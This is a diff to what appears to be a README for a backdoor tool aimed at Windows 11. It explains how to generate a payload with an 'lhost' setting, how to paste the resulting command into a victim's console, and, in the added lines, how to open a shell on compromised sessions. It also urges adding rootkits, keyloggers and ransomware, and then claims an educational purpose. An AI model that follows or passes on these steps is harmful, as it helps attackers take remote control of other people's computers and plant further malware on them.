@@ -53,6 +53,13 @@ generate os=TARGETOS lhost=YOURINTERFACE/IP
 
 With this command you generate a payload for the desired `os` os meaning operating system in our case that would be `os=windows`. lhost is for defining on which interface/ip you wan't to host this backfoor in our case that would be lhost=eth0, `eth0` for the interface of your choice. After doing this there will be a command that will be outputed copy that command and put that in the windows 11 shell or any console and let the mayham begin. After having you backdoor finalized you can expand it and implement rootkits and other multiple backdoors or keyloggers and even download more malicious software such as Virus' or ransomware.
 
+Now how to establish connection. To establish a connection you have to enter the following command:
+
+``
+sessions
+shell [session ID]
+``
+
 #### disclaimer 
 
 I will not include all steps I've made for this exploit because you could do serious harm with that knowledge and I do not condone such harmful behaviour this documentation is purely for the purpose of education
